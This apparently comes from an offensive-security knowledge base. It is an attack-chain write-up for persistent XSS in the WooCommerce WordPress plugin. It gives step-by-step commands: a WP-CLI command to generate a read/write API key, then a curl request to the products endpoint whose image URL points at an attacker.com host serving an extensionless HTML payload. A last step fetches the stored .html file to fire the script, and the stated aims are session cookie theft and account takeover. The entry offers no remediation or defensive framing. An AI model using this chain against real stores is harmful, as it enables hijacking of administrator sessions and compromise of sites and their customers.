---
id: ac-woocommerce-xss-upload
tags:
  - xss
  - woocommerce
  - wordpress
  - api
  - file-upload
  - persistent-xss
type: attack_chain
tools: []
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
verified: false
platforms:
  - Web
  - WordPress
  - PHP
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Create-WooCommerce-API-Key-with-Read-Write-Permissions]]'
  - '[[procedures/Upload-Malicious-HTML-via-URL-in-WooCommerce-API]]'
  - '[[procedures/Trigger-XSS-by-Accessing-Uploaded-File]]'
step_count: 3
techniques:
  - '[[JavaScript]]'
  - '[[Remote File Copy]]'
updated_at: '2025-12-14T03:16:14.210Z'
description: >-
  A multi-stage attack exploiting insufficient file type validation in
  WooCommerce's API image upload from URL feature to upload and execute
  malicious HTML payloads, leading to persistent XSS for authenticated users.
skill_level: intermediate
impact_level: high
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Remote File Copy]]'
---
# Persistent XSS via Malicious HTML Upload in WooCommerce API

Multi-stage attack chain demonstrating a complete attack workflow exploiting a persistent XSS vulnerability in the WooCommerce WordPress plugin through API-based file uploads.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 3 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Create API Key] --> B[Upload Malicious HTML]
    B --> C[Trigger XSS Execution]
    C --> D[Session Hijacking]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- None (uses standard HTTP clients like curl)

### Target Environment

- WordPress with WooCommerce plugin installed
- API enabled on the target site
- PHP backend

### Initial Access Requirements

- Administrative access to WordPress to generate API keys (or stolen credentials with unfiltered_html permissions)
- Network access to the WooCommerce REST API endpoints
- No prior access needed beyond API credentials

## Detailed Attack Procedures

### Step 1: Create API Key
procedure: [[procedures/Create-WooCommerce-API-Key-with-Read-Write-Permissions]]

**Objective**: Generate an API key with Read/Write permissions to enable file uploads, inheriting unfiltered_html capabilities if the key owner has them.

**Instructions**: Access the WooCommerce settings in WordPress admin to create the key. Use [[commands/create-woocommerce-api-key]] to simulate or automate if scripting:

```bash
# This is a conceptual command; in practice, use WordPress admin UI or WP-CLI
wp woocommerce key generate --user=1 --permissions=read_write --description="Test Key"
```

**Expected Output**: API key and secret generated, e.g., consumer_key: ck_xxxx, consumer_secret: cs_xxxx.

**Success Indicators**:
- API key created with Read/Write access
- Key inherits unfiltered_html permission

### Step 2: Upload Malicious File
procedure: [[procedures/Upload-Malicious-HTML-via-URL-in-WooCommerce-API]]

**Objective**: Upload a malicious HTML file disguised as an image by providing a URL to an HTML payload without extension, exploiting filename generation from headers.

**Instructions**: Host a malicious HTML file (e.g., containing <script>alert('XSS')</script>) on a server without extension in the URL. Then use [[commands/upload-image-via-woocommerce-api]] to upload via the API:

```bash
curl -X POST "https://target.com/wp-json/wc/v3/products" \
  -u "ck_xxxx:cs_xxxx" \
  -H "Content-Type: application/json" \
  -d '{"name":"Test Product","images":[{"src":"http://attacker.com/malicious?noext"}]}'
```

**Expected Output**: Product created with image uploaded, filename generated as .html due to content-type headers, stored without proper validation.

**Success Indicators**:
- Upload succeeds without error
- File saved with .html extension in media library

### Step 3: Trigger XSS
procedure: [[procedures/Trigger-XSS-by-Accessing-Uploaded-File]]

**Objective**: Access the uploaded HTML file to execute the embedded JavaScript in the browser of authenticated users viewing the content.

**Instructions**: As an authenticated user (admin/editor), view the product or media file. Use [[commands/access-uploaded-file]] to fetch and trigger:

```bash
curl -u "admin:pass" "https://target.com/wp-content/uploads/2023/malicious.html"
```

In browser, navigate to the URL; JavaScript executes on load.

**Expected Output**: JavaScript payload executes, e.g., alert pops or session cookie exfiltrated.

**Success Indicators**:
- JavaScript runs in victim's browser
- Potential session hijacking observed

## Attack Chain Summary

### Key Achievements

1. Bypassed file upload validation to store executable HTML
2. Achieved persistent XSS for authenticated users
3. Enabled potential account takeover via session theft

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[JavaScript]]
- [[Remote File Copy]]

### MITRE ATT&CK Tactics

- [[Execution]]
- [[Collection]]

---

*Last updated: 2023-10-01T00:00:00Z*
